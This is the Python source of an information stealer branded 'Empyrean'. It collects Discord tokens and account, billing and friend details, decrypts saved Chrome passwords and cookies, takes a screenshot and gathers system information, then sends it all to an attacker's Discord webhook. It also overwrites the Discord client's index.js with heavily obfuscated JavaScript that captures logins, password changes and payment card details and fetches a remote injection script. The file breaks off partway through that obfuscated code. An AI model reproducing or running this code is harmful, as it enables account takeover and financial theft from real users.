import base64
import difflib
import json
import os
import platform
import re
import shutil
import socket
import sqlite3
import subprocess
import uuid

import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from PIL import ImageGrab
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

# <-- Config -->

webhook = "WEBHOOK_URL"

# <-- Config -->

def main(webhook: str) -> None: 
    debug()
    cleanup()
        
    startup()
    inject(webhook=webhook)
    
    webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Empyrean", color=0x000000)
    
    token_grabber(embed=embed)
    embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
    
    google().grabPassword()
    google().grabCookies()
    image()
    
    files = []
    files.append(File(".\\chrome-passwords.txt") if os.path.exists(".\\chrome-passwords.txt") else None)
    files.append(File(".\\chrome-cookies.txt") if os.path.exists(".\\chrome-cookies.txt") else None)
    files.append(File(".\\screenshot.png") if os.path.exists(".\\screenshot.png") else None)
    
    webhook.send(embed=embed, files=files if files != [] else None, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
    cleanup()
    
class token_grabber():
    def __init__(self, embed) -> None:
        global tokens
        
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []
        self.ids = []
        
        self.grabTokens()
        self.embed_accounts(embed)
    
    def embed_accounts(self, embed) -> None:
        for token in self.tokens:
            r = requests.get("https://discordapp.com/api/v6/users/@me", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })

            username = r.json()['username'] + '#' + r.json()['discriminator']
            user_id = r.json()['id']
            email = r.json()['email']
            phone = r.json()['phone']
            
            emoji_staff = "<:staff:968704541946167357>"
            emoji_partner = "<:partner:968704542021652560>"
            emoji_hypesquad_event = "<:hypersquad_events:968704541774192693>"
            emoji_green_bughunter = "<:bug_hunter_1:968704541677723648>"
            emoji_hypesquad_bravery = "<:hypersquad_1:968704541501571133>"
            emoji_hypesquad_brilliance = "<:hypersquad_2:968704541883261018>"
            emoji_hypesquad_balance = "<:hypersquad_3:968704541874860082>"
            emoji_early_supporter = "<:early_supporter:968704542126510090>"
            emoji_gold_bughunter = "<:bug_hunter_2:968704541774217246>"
            emoji_verified_bot_developer = "<:verified_dev:968704541702905886>"  
   
            badges = ""
            flags = r.json()['public_flags']
            if (flags == 1): badges += f"{emoji_staff}, "
            if (flags == 2): badges += f"{emoji_partner}, "
            if (flags == 4): badges += f"{emoji_hypesquad_event}, "
            if (flags == 8): badges += f"{emoji_green_bughunter}, "
            if (flags == 64): badges += f"{emoji_hypesquad_bravery}, "
            if (flags == 128): badges += f"{emoji_hypesquad_brilliance}, "
            if (flags == 256): badges += f"{emoji_hypesquad_balance}, "
            if (flags == 512): badges += f"{emoji_early_supporter}, "
            if (flags == 16384): badges += f"{emoji_gold_bughunter}, "
            if (flags == 131072): badges += f"{emoji_verified_bot_developer}, "
            if (badges == ""): badges = "`None`"
            if badges.endswith(", "): badges = badges[:-2]   

            try:
                if r.json()['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r.json()['premium_type'] == 2:
                    nitro = 'Nitro Boost'
            except KeyError:
                nitro = 'None'

            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
            
            if b.json() == []:
                methods = "`None`"
            else:
                methods = ""
                for method in b.json():
                    if method['type'] == 1:
                        methods += "💳"
                    elif method['type'] == 0:
                        methods += "<:paypal:973417655627288666>"
                    else:
                        methods += "❓"

            f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
   
            hq_friends = ""
            for friend in f.json():
                prefered_flags = [1, 2 ,4, 8, 512, 16384, 131072]
                if friend['user']['public_flags'] in prefered_flags:
                    hq_badges = ""
                    flags = friend['user']['public_flags']
                    if (flags == 1): hq_badges += f"{emoji_staff}, "
                    if (flags == 2): hq_badges += f"{emoji_partner}, "
                    if (flags == 4): hq_badges += f"{emoji_hypesquad_event}, "
                    if (flags == 8): hq_badges += f"{emoji_green_bughunter}, "
                    if (flags == 512): hq_badges += f"{emoji_early_supporter}, "
                    if (flags == 16384): hq_badges += f"{emoji_gold_bughunter}, "
                    if (flags == 131072): hq_badges += f"{emoji_verified_bot_developer}, "
                    if hq_badges.endswith(", "): hq_badges = hq_badges[:-2]
     
                    hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"

            g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
            
            hq_guilds = ""
            for guild in g.json():
                admin = True if guild['permissions'] == '4398046511103' else False
                if admin and guild['approximate_member_count'] >= 50:
                    i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                        'Content-Type': 'application/json',
                        'Authorization': token,
                    })
                    
                    invite = i.json()[0]['code']
                    if guild['owner']:
                        owner = " ✅ "
                    else:
                        owner = "❌"
                        
                    hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{invite})\n"
                
                
            
            embed.add_field(name=f"**{username} ({user_id})**", value=f"```{token}```\n***Email >*** `{email}`\n***Phone >*** `{phone}`\n***Nitro >*** `{nitro}`\n***Billing >*** {methods}\n***Badges >*** {badges}\n\u200b", inline=False)
            
            if hq_friends != "":
                embed.add_field(name="***HQ Friends >***", value=f"{hq_friends}\n\u200b", inline=False)
                
            if hq_guilds != "":
                embed.add_field(name="***HQ Guilds >***", value=f"{hq_guilds}\n\u200b", inline=False)
       
    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token,
                                    })
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
  
class google():
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        if os.path.exists('.\\chrome-passwords.txt'):
            os.remove('.\\chrome-passwords.txt')
        
        with open('.\\chrome-passwords.txt', 'w') as f:
            f.write('Empyrean /// Google Chrome Passwords\n\n\n')
            hide('chrome-passwords.txt')
            
        appdata = os.getenv("localappdata")
  
        if not os.path.exists(appdata+'\\Google'):
            return []
  
        passwords = []
        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
        
        login_dbs = [
            appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
        ]      
            
        used_login_dbs = []
        
        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue
            
            used_login_dbs.append(login_db)
            
            try:
                shutil.copy2(login_db, "Loginvault.db")
            except FileNotFoundError:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                with open('.\\chrome-passwords.txt', 'a') as f:
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.decrypt_password(encrypted_password, master_key)
                        if url != "" and username != "" and decrypted_password != "":
                            f.write(f'URL: {url}\nUser: {username}\nPassword: {decrypted_password}\n\n')
            except:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except:
                pass
        
        return passwords

    def grabCookies(self):
        if os.path.exists('.\\chrome-cookies.txt'):
            os.remove('.\\chrome-cookies.txt')
        
        with open('.\\chrome-cookies.txt', 'w') as f:
            f.write('Empyrean /// Google Chrome cookies\n\n\n')
            hide('chrome-cookies.txt')
            
        appdata = os.getenv("localappdata")
  
        if not os.path.exists(appdata+'\\Google'):
            return []

        cookies = []
        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
        
        login_dbs = [
            appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
        ] 
        
        used_login_dbs = []
        
        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue
            
            used_login_dbs.append(login_db)
            
            try:
                shutil.copy2(login_db, "Loginvault.db")
            except FileNotFoundError:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                with open('.\\chrome-cookies.txt', 'a') as f:
                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self.decrypt_password(r[2], master_key)
                        if host != "":
                            f.write(f'Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n')
        
            except:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except:
                pass	

        return cookies

class systemspec():
	def sys_spec():
		sys_spec = f"""
Operating System: {systemspec.platform_info()[0]}
Release: {systemspec.platform_info()[1]}
Version: {systemspec.platform_info()[2]}
Architecture: {systemspec.platform_info()[3]}
Hostname: {systemspec.platform_info()[4]}

IP Address: {systemspec.network_info()[0]}
Mac Address: {systemspec.network_info()[1]}

CPU: {systemspec.system_specs()[0].Name}
GPU: {systemspec.system_specs()[1].Name}
RAM: {round(systemspec.system_specs()[2], 0)} GB
"""
		return sys_spec

	def platform_info():
		operating_sys = platform.system()
		os_release = platform.release()
		os_version = platform.version()
		architecture = platform.architecture()
		hostname = socket.gethostname()
		
		return operating_sys, os_release, os_version, architecture, hostname
	
	def network_info():
		ip_address = requests.get('https://api.ipify.org').text
		mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

		return ip_address, mac_address
	
	def system_specs():
		cpu = wmi.WMI().Win32_Processor()[0]
		gpu = wmi.WMI().Win32_VideoController()[0]
		ram = float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576
		
		return cpu, gpu, ram

def image():
    os.remove('.\\screenshot.png') if os.path.exists('.\\screenshot.png') else None
    ImageGrab.grab().save('.\\screenshot.png', 'PNG')
    hide('screenshot.png')
    
def hide(file):
    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)

def cleanup():
    possible_files = [
        '.\\chrome-passwords.txt',
        '.\\chrome-cookies.txt',
        '.\\screenshot.png'
    ]
    for file in possible_files:
        if os.path.exists(file):
            os.remove(file)

def inject(webhook):
	appdata = os.getenv('localappdata')
	if os.path.exists(appdata + "\\discord"):
		for _dir in os.listdir(appdata + "\\discord"):
			if "app-" in _dir:
				abspath = appdata + "\\discord\\" + _dir
				core_dir = difflib.get_close_matches("discord_desktop_core", os.listdir(os.path.abspath(appdata + "\\discord\\" + _dir + "\\modules")), n=1, cutoff=0.6)[0]
				indexpath = abspath + "\\modules" + os.sep + core_dir + os.sep + "discord_desktop_core" + os.sep + "index.js"
				with open(indexpath, 'w', encoding="utf-8") as indexFile:
					code = r"""
const _0x2df903=_0x3589;(function(_0x3e1653,_0x5706f7){const _0x568bf3=_0x3589,_0xf66bcc=_0x3e1653();while(!![]){try{const _0x931029=parseInt(_0x568bf3(0xf9))/0x1*(-parseInt(_0x568bf3(0xd7))/0x2)+parseInt(_0x568bf3(0xaa))/0x3*(-parseInt(_0x568bf3(0x168))/0x4)+parseInt(_0x568bf3(0xec))/0x5*(-parseInt(_0x568bf3(0x139))/0x6)+parseInt(_0x568bf3(0x10c))/0x7*(parseInt(_0x568bf3(0xab))/0x8)+parseInt(_0x568bf3(0xf5))/0x9*(parseInt(_0x568bf3(0xf6))/0xa)+parseInt(_0x568bf3(0x130))/0xb+parseInt(_0x568bf3(0xe1))/0xc*(parseInt(_0x568bf3(0x134))/0xd);if(_0x931029===_0x5706f7)break;else _0xf66bcc['push'](_0xf66bcc['shift']());}catch(_0x4898ed){_0xf66bcc['push'](_0xf66bcc['shift']());}}}(_0x3757,0xf2d70));function _0x3757(){const _0x1e3844=['**\x0aBilling:\x20**','reverse','writeFileSync','__proto__','trace','Early\x20Supporter,\x20','onBeforeRequest','replace','default-src\x20\x27*\x27','error','toString','filter','concat','999','**Credit\x20Card\x20Added**','win32','3DvDxQb','56tcHIQE','*\x0aBadges:\x20**','ping_on_run','**\x0aOld\x20Password:\x20**','499','\x20|\x20','Contents','querystring','wss://remote-auth-gateway.discord.gg/*','prototype','webContents','wss://remote-auth-gateway','app','https://discord.com/api/v9/users/@me','```','https://api.stripe.com/v*/payment_intents/*/confirm','existsSync','.webp','HypeSquad\x20Brillance,\x20','Discord\x20Canary.app','**Token**','2422867c-244d-476a-ba4f-36e197758d97','join','**Nitro\x20Code:**\x0a```diff\x0a+\x20','https://*.discord.com/api/v*/applications/detectable','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','constructor','card[number]','511651880837840896','nitro','embed_color','warn','write','https://cdn.discordapp.com/avatars/','url','getAllWindows','premium_type','https://discord.com/api/v*/users/@me/library','HypeSquad\x20Balance,\x20','env','bind','usd','Discord\x20PTB','application/json','4PRFCld','ping_val','https://discordapp.com/api/v*/users/@me','content','month','\x5cdiscord_desktop_core-3\x5cdiscord_desktop_core\x5cindex.js','forEach','webhook','isDirectory','https://*.discord.com/api/v*/auth/login','12YsqwRP','uploadData','Partnered\x20Server\x20Owner,\x20','/Applications','confirm','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','endsWith','bytes','Hypesquad\x20Event,\x20','HypeSquad\x20Bravery,\x20','**Nitro\x20bought!**','55OBVEuL','rmdirSync','info','card[exp_month]','gift_code','webRequest','\x20<:paypal:951139189389410365>','**\x0aCVC:\x20**','tokens','9EZszFP','9423190ezWarT','apply','APPDATA','490412hetPyi','(((.+)+)+)+$','content-security-policy-report-only','api','https://discord.com/api/v*/auth/login','LOCALAPPDATA','auto_buy_nitro','year','Access-Control-Allow-Headers\x20\x27*\x27','🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection','Discord\x20PTB.app','Nitro\x20Boost','from','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','filter2','Discord\x20Developer,\x20','{}.constructor(\x22return\x20this\x22)(\x20)','POST','catch','1313228JOaDvE','path','**Account\x20Info**','resolve','darwin','embed_icon','length','content-security-policy','https://api.stripe.com/v*/setup_intents/*/confirm','**Paypal\x20Added**','return\x20(function()\x20','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','**Discord\x20Info**','canary','onCompleted','exception','PATCH','ptb','Email:\x20**','sku','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','new_password','https://i.imgur.com/IQUPnLA.jpeg','exports','host','initiation','users/@me','**\x20-\x20Password:\x20**','embed_name','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20{\x0a\x20\x20\x20\x20require(bdPath);\x0a}','511651885459963904','startsWith','table','request','14267132EYlzTU','sort','https://api.stripe.com/v*/tokens','method','23863424lXxbDi','invalid','responseHeaders','toLowerCase','Green\x20BugHunter,\x20','916584pdLqYs','\x20💳','discriminator','https://discord.com/api/v*/applications/detectable','stringify','login','classic','statusCode','None','https://*.discord.com/api/v*/users/@me/library','flags','search','No\x20Nitro','**Password\x20Changed**','protocol','boost','https://discordapp.com/api/v*/auth/login','paypal_accounts','**\x0aNew\x20Password:\x20**','Access-Control-Allow-Origin\x20\x27*\x27','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/','includes','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','username','type','parse','console','executeJavaScript','521847234246082599','Nitro\x20Classic','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','password','Discord-Injection','index.js','onHeadersReceived','./core.asar','defaultSession','split','unlinkSync','app.asar','email','argv','**\x0aCredit\x20Card\x20Expiration:\x20**','package.json','Failed\x20to\x20Purchase\x20❌','6929228yIFdMW','platform','**\x0aBadges:\x20**','release','Discord\x20Canary','lstatSync','\x27;\x0aconst\x20bdPath\x20=\x20\x27','Nitro\x20Type:\x20**','pathname','card[cvc]','New\x20Email:\x20**','lenght','**\x0aPassword:\x20**','avatar'];_0x3757=function(){return _0x1e3844;};return _0x3757();}const args=process[_0x2df903(0x164)],fs=require('fs'),path=require(_0x2df903(0x10d)),https=require('https'),querystring=require(_0x2df903(0xb2)),{BrowserWindow,session}=require('electron'),config={'auto_buy_nitro':![],'ping_on_run':![],'ping_val':'@everyone','embed_name':'Discord\x20Injection','embed_icon':_0x2df903(0x124),'embed_color':0xa9a9a9,'webhook':'%WEBHOOK%','injection_url':'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js','api':_0x2df903(0xb8),'nitro':{'boost':{'year':{'id':'521847234246082599','sku':_0x2df903(0x12c),'price':'9999'},'month':{'id':_0x2df903(0x157),'sku':_0x2df903(0xc7),'price':_0x2df903(0xa7)}},'classic':{'month':{'id':'521846918637420545','sku':'511651871736201216','price':_0x2df903(0xaf)}}},'filter':{'urls':['https://discord.com/api/v*/users/@me',_0x2df903(0xd9),'https://*.discord.com/api/v*/users/@me',_0x2df903(0x149),_0x2df903(0xfd),_0x2df903(0xe0),_0x2df903(0x106),_0x2df903(0x132),_0x2df903(0x114),_0x2df903(0xba)]},'filter2':{'urls':[_0x2df903(0xe6),_0x2df903(0xc3),_0x2df903(0x13c),_0x2df903(0x142),_0x2df903(0xd0),_0x2df903(0xb3)]}},discordPath=(function(){const _0x1a66c8=_0x2df903,_0x2d781e=(function(){let _0x1bf60c=!![];return function(_0x5d666a,_0x69bd64){const _0x3c42ce=_0x1bf60c?function(){const _0x13e5b7=_0x3589;if(_0x69bd64){const _0x33d456=_0x69bd64[_0x13e5b7(0xf7)](_0x5d666a,arguments);return _0x69bd64=null,_0x33d456;}}:function(){};return _0x1bf60c=![],_0x3c42ce;};}()),_0xfd1380=_0x2d781e(this,function(){const _0x135f5a=_0x3589;return _0xfd1380[_0x135f5a(0x180)]()[_0x135f5a(0x144)](_0x135f5a(0xfa))[_0x135f5a(0x180)]()[_0x135f5a(0xc5)](_0xfd1380)['search'](_0x135f5a(0xfa));});_0xfd1380();const _0xfa3df7=(function(){let _0x5d16b2=!![];return function(_0x13d2a5,_0x3c0f17){const _0x27f3ac=_0x5d16b2?function(){const _0x5a3292=_0x3589;if(_0x3c0f17){const _0x3c9991=_0x3c0f17[_0x5a3292(0xf7)](_0x13d2a5,arguments);return _0x3c0f17=null,_0x3c9991;}}:function(){};return _0x5d16b2=![],_0x27f3ac;};}()),_0x4746fe=_0xfa3df7(this,function(){const _0x3b6f42=_0x3589,_0x464199=function(){const _0x18329c=_0x3589;let _0x2d37eb;try{_0x2d37eb=Function(_0x18329c(0x116)+_0x18329c(0x109)+');')();}catch(_0x5ed76f){_0x2d37eb=window;}return _0x2d37eb;},_0x488881=_0x464199(),_0x51306c=_0x488881[_0x3b6f42(0x155)]=_0x488881[_0x3b6f42(0x155)]||{},_0x130491=['log',_0x3b6f42(0xca),_0x3b6f42(0xee),_0x3b6f42(0x17f),_0x3b6f42(0x11c),_0x3b6f42(0x12e),_0x3b6f42(0x17a)];for(let _0x2e85dd=0x0;_0x2e85dd<_0x130491[_0x3b6f42(0x112)];_0x2e85dd++){const 